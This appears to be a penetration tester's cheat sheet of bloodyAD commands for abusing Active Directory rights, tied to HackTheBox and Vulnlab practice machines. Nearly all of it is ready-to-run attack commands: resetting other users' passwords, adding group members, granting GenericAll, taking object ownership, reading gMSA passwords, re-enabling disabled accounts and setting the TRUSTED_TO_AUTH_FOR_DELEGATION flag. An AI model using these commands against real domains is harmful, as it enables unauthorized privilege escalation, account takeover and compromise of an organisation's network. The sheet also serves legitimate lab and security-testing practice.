### Retrieve User Information
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```
### Add User To Group
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```
### Change Password
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```
### Give User GenericAll Rights
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```
### WriteOwner
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```
### ReadGMSAPassword
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```
### Enable a Disabled Account
```bash
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```
### Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
### Notes
To use Kerberos, obtain a TGT and then pass `-k` instead of providing a username and password
### Resources
- Redelegate (Vulnlab)
- Vintage (HackTheBox)
- Infiltrator (HackTheBox)
- Rebound (HackTheBox)
- Absolute (HackTheBox)
- Certified (HackTheBox)
